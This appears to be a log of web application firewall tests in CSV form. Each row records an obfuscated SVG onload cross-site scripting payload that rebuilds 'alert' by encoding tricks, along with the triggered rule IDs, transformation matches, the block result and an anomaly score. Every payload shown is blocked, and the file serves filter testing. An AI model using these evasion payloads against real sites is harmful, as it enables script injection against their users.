2068,"<svg onload=""(function(){var a=atob('YWxlcnQ=');window[a](1);})();""></svg>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o54,11v217,74t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,74 || v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o48,9v217,74t:urlDecodeUni,t:compressWhitespace || ",30,177603520193.926624
2069,"<svg onload=""(function(){var a=[]['constructor']['constructor']('return String')()['fromCharCode'](97,108,101,114,116);window[a](1);})();""></svg>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o31,105v217,145t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,145 || v217,145t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,145t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,145t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o119,9v217,145t:urlDecodeUni,t:compressWhitespace || ",30,177603520289.692550
2070,"<svg onload=""(function(){var a=String.fromCharCode(0x61,0x6c,0x65,0x72,0x74);window[a](1);})();""></svg>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o83,11v217,103t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,103 || v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o77,9v217,103t:urlDecodeUni,t:compressWhitespace || ",30,177603520465.724592
2071,"<svg onload=""(function(){var a=String.fromCharCode(141-44,108,101,114,116);window[a](1);})();""></svg>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o81,11v217,101t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,101 || v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o75,9v217,101t:urlDecodeUni,t:compressWhitespace || ",30,177603520598.459472
2072,"<svg onload=""(function(){var a=unescape('%61%6c%65%72%74');window[a](1);})();""></svg>",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o55,11v217,85t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,85 || o14,11v217,85t:urlDecodeUni || v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o49,9v217,85t:urlDecodeUni,t:compressWhitespace || ",35,177603520610.608176
2073,"<svg onload=""(function(){var a='al'+'ert';window[a](1);})();""></svg>",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o48,11v217,68t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,68 || o14,11v217,68t:urlDecodeUni || v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o42,9v217,68t:urlDecodeUni,t:compressWhitespace || ",35,177603520786.099487
2074,"<svg onload=""(function(){var a=`${String.fromCharCode(97)}${String.fromCharCode(108)}${String.fromCharCode(101)}${String.fromCharCode(114)}${String.fromCharCode(116)}`;window[a](1);})();""></svg>",0,1,block,8,"932130,933210,934100,941100,941120,941160,941370,949110","o31,150v217,194t:urlDecodeUni,t:cmdLine || o174,11v217,194t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,194 || v217,194t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,194t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,194t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o168,9v217,194t:urlDecodeUni,t:compressWhitespace || ",35,17760352091.245579
2076,"<svg onload=""(function(){var a=decodeURI('%61%6C%65%72%74');window[a](1);})();""></svg>",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o56,11v217,86t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,86 || o14,11v217,86t:urlDecodeUni || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o50,9v217,86t:urlDecodeUni,t:compressWhitespace || ",35,177603521112.920510
2077,"<svg onload=""(function(){var a=String['from'+'Char'+'Code'](97,108,101,114,116);window[a](1);})();""></svg>",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o37,60v217,106t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,106 || o14,11v217,106t:urlDecodeUni || v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o80,9v217,106t:urlDecodeUni,t:compressWhitespace || ",35,177603521246.362250
2080,"<svg onload=""(function(){var a=String.fromCodePoint(97,108,101,114,116);window[a](1);})();""></svg>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o78,11v217,98t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,98 || v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o72,9v217,98t:urlDecodeUni,t:compressWhitespace || ",30,177603521629.940766
2082,"<svg onload=""(function(){var a=String['fromCharCode'].apply(null,[97,108,101,114,116]);window[a](1);})();""></svg>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o93,11v217,113t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,113 || v217,113t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,113t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,113t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o87,9v217,113t:urlDecodeUni,t:compressWhitespace || ",30,177603521857.831313
2084,"<svg onload=""(function(){var a=[97,108,101,114,116].map(x=>String.fromCharCode(x)).join('');window[a](1);})();""></svg>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o98,11v217,118t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,118 || v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o92,9v217,118t:urlDecodeUni,t:compressWhitespace || ",30,177603522072.525164
2085,"<svg onload=""(function(){var a=Array.from({length:5},(v,k)=>String.fromCharCode([97,108,101,114,116][k])).join('');window[a](1);})();""></svg>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o121,11v217,141t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,141 || v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o115,9v217,141t:urlDecodeUni,t:compressWhitespace || ",30,177603522139.887195
2086,"<svg onload=""(function(){var a=String.fromCharCode(...[97,108,101,114,116]);window[a](1);})();""></svg>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o82,11v217,102t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,102 || v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o76,9v217,102t:urlDecodeUni,t:compressWhitespace || ",30,177603522292.051775
2088,"<svg onload=""(function(){var a=String['fromCh'+'arCode'];var b=a(97,108,101,114,116);window[b](1);})();""></svg>",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o91,11v217,111t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,111 || o14,11v217,111t:urlDecodeUni || v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,9v217,111t:urlDecodeUni,t:compressWhitespace || ",35,177603522537.266489
2089,"<svg onload=""(function(){var a=''['constructor']['constructor']('return String')()['fromCharCode'];var b=a(97,108,101,114,116);window[b](1);})();""></svg>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o33,111v217,153t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,153 || v217,153t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,153t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,153t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o127,9v217,153t:urlDecodeUni,t:compressWhitespace || ",30,177603522692.154265
2090,"<svg onload=""(function(){var a=String.fromCodePoint;var b=a(97,108,101,114,116);window[b](1);})();""></svg>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o86,11v217,106t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,106 || v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o80,9v217,106t:urlDecodeUni,t:compressWhitespace || ",30,177603522766.131048
2091,"<svg onload=""(function(){var a=String.fromCharCode;var b=a(0x61,0x6c,0x65,0x72,0x74);window[b](1);})();""></svg>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o91,11v217,111t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,111 || v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,9v217,111t:urlDecodeUni,t:compressWhitespace || ",30,177603522884.763880
2092,"<svg onload=""(function(){var&#9;a=String.fromCharCode;var&#10;b=a(97)+a(108)+a(101)+a(114)+a(116);window[b](1);})();""></svg>",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o104,11v217,124t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,124 || o14,11v217,124t:urlDecodeUni || v217,124t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,124t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,124t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o98,9v217,124t:urlDecodeUni,t:compressWhitespace || ",35,17760352306.291335
2093,"<svg onload=""(function(){var a=String.fromCharCode;var b=a(97,108,101,114,116);self[b](1);})();""></svg>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o83,11v217,103t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,103 || v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o79,7v217,103t:urlDecodeUni,t:compressWhitespace || ",30,177603523157.926339
2094,"<svg onload=""(function(){var a=String.fromCharCode;var b=a(97,108,101,114,116);top[b](1);})();""></svg>",0,1,block,8,"932105,933210,934100,941100,941120,941160,941370,949110","o78,4v217,102 || o82,11v217,102t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,102 || v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o79,6v217,102t:urlDecodeUni,t:compressWhitespace || ",35,177603523242.220662
2096,"<svg onload=""(function(){var a=String.fromCharCode;var b=a(97)+a(108)+a(101)+a(114)+a(116);this[b](1);})();""></svg>",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o95,11v217,115t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,115 || o14,11v217,115t:urlDecodeUni || v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o91,7v217,115t:urlDecodeUni,t:compressWhitespace || ",35,177603523477.521273
2097,"<svg onload=""(function(){var a=String.fromCharCode;var b=a(97,108,101,114,116);globalThis[b](1);})();""></svg>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o89,11v217,109t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,109 || v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603523560.039947
2099,"<svg onload=""(function(){var a=String.fromCharCode;var b=String.fromCharCode(97,108,101,114,116);window[b](1);})();""></svg>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o103,11v217,123t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,123 || v217,123t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,123t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,123t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o97,9v217,123t:urlDecodeUni,t:compressWhitespace || ",30,177603523870.961102
2100,"<svg onload=""(function(){var a=String.fromCharCode;var b=a(parseInt('61',16),parseInt('6c',16),parseInt('65',16),parseInt('72',16),parseInt('74',16));window[b](1);})();""></svg>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o156,11v217,176t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,176 || v217,176t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,176t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,176t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o150,9v217,176t:urlDecodeUni,t:compressWhitespace || ",30,17760352396.820708
2101,"<svg onload=""(function(){var a=String.fromCharCode;var b=a(141-44,154-46,153-52,162-48,168-52);window[b](1);})();""></svg>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o101,11v217,121t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,121 || v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o95,9v217,121t:urlDecodeUni,t:compressWhitespace || ",30,177603524013.985911
2102,"<svg onload=""(function(){var a=String['fromCharCode'];var b=a.call(String,97,108,101,114,116);window[b](1);})();""></svg>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o100,11v217,120t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,120 || v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o94,9v217,120t:urlDecodeUni,t:compressWhitespace || ",30,17760352416.196641
2103,"<svg onload=""(function(){var a=String.fromCharCode;var b=a.apply(null,[97,108,101,114,116]);window[b](1);})();""></svg>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o98,11v217,118t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,118 || v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o92,9v217,118t:urlDecodeUni,t:compressWhitespace || ",30,177603524299.037184
2104,"<svg onload=""(function(){var a=String.fromCharCode;var b=a(...[97,108,101,114,116]);window[b](1);})();""></svg>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o90,11v217,110t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,110 || v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o84,9v217,110t:urlDecodeUni,t:compressWhitespace || ",30,17760352433.211346
2105,"<svg onload=""(function(){var a=String.fromCharCode;var b=a(97)['concat'](a(108),a(101),a(114),a(116));window[b](1);})();""></svg>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o58,61v217,128t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,128 || v217,128t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,128t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,128t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o102,9v217,128t:urlDecodeUni,t:compressWhitespace || ",30,177603524545.774678
2107,"<svg onload=""(function(){var a=top['al'+'ert'];a(1);})();""></svg>",0,1,block,7,"934100,934100,941100,941120,941160,941370,949110","o14,11v217,65 || o14,11v217,65t:urlDecodeUni || v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o31,15v217,65t:urlDecodeUni,t:compressWhitespace || ",30,177603524749.639584
2108,"<svg onload=""(function(){var a=self['al\x65rt'];a(1);})();""></svg>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v217,66 || v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o31,16v217,66t:urlDecodeUni,t:compressWhitespace || ",25,17760352496.282257
2109,"<svg onload=""(function(){var a=parent['a'+'lert'];a(1);})();""></svg>",0,1,block,6,"934100,934100,941100,941120,941160,949110","o14,11v217,68 || o14,11v217,68t:urlDecodeUni || v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,17760352506.053016
2110,"<svg onload=""(function(){var a=this['al\u0065rt'];a(1);})();""></svg>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v217,68 || v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o31,18v217,68t:urlDecodeUni,t:compressWhitespace || ",25,177603525140.516785
2111,"<svg onload=""(function(){var a=globalThis['al'+'ert'];a(1);})();""></svg>",0,1,block,6,"934100,934100,941100,941120,941160,949110","o14,11v217,72 || o14,11v217,72t:urlDecodeUni || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603525389.648560
2112,"<svg onload=""(function(){var a=window['\x61lert'];a(1);})();""></svg>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v217,68 || v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o31,18v217,68t:urlDecodeUni,t:compressWhitespace || ",25,177603525467.442924
2113,"<svg onload=""(function(){var a=window['ale'+'rt'];a(1);})();""></svg>",0,1,block,7,"934100,934100,941100,941120,941160,941370,949110","o14,11v217,68 || o14,11v217,68t:urlDecodeUni || v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o31,18v217,68t:urlDecodeUni,t:compressWhitespace || ",30,177603525527.053454
2114,"<svg onload=""(function(){var a=top['\u0061lert'];a(1);})();""></svg>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v217,67 || v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o31,17v217,67t:urlDecodeUni,t:compressWhitespace || ",25,177603525613.771889
2115,"<svg onload=""(function(){var a=self[String.fromCharCode(97,108,101,114,116)];a(1);})();""></svg>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v217,95 || v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o31,45v217,95t:urlDecodeUni,t:compressWhitespace || ",25,177603525788.186884
2116,"<svg onload=""(function(){var a=window[atob('YWxlcnQ=')];a(1);})();""></svg>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v217,74 || v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o31,24v217,74t:urlDecodeUni,t:compressWhitespace || ",25,177603525878.281348
2117,"<svg onload=""(function(){var a=window['al\x65\x72t'];a(1);})();""></svg>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v217,71 || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o31,21v217,71t:urlDecodeUni,t:compressWhitespace || ",25,177603526019.080114
